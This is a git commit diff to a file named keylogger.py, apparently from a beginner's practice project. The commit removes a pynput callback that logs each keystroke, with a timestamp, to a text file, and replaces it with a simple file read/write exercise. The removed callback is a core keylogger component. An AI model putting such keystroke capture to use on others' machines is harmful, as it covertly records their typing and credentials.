963288fd303e08a1db54d0ad78fe6a2bff1a9d2b
ikaaaa21 <himikakaur21@gmail.com>
2025-03-02 21:43:05 +0000

    Change, created a txt file to write and read

--- keylogger.py
+++ keylogger.py
@@ -1,20 +1,15 @@
-from pynput import keyboard
-from datetime import datetime
+# storing the keystorkes in a text file
+# file handling- how to read, write and append a file
 
-def when_pressed(key): #This function is called everytime a key is pressed. Key is taken as an argument.
-    try:
-        char = key.char 
-    except AttributeError: #pynput library has Key objects for special keys like space, shift, ctrl, etc. 
-        if key == keyboard.Key.space:
-            char = " " 
-        elif key == keyboard.Key.enter:
-            char = "\n"
-        else:
-            char = f"[{key.name}]" # Format special keys like [SHIFT], [CTRL], etc.
+f = open('log.txt', 'w')
+f.write('Hello World') # write to the file , it takes up reserouces
+f.close() #good practice to close the file , gives back the resources to the system
 
-    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S") # Get current time in the format "YYYY-MM-DD HH:MM:SS" it will log the keystroke with the timestamp.
-    try: 
-        with open("keylog.txt" , "a", encoding="utf-8") as file: 
-            file.write(f"{timestamp} : {char}\n") # Write the keystroke to the file. 'with' keyword it releases the memory automatically
-    except Exception as e:
-        print(f"Error: {e}")    
+
+
+# r - reading
+# w - writing
+# a - appending 
+# r+ - reading and writing
+# w+ - writing and reading
+# a+ - appending and reading
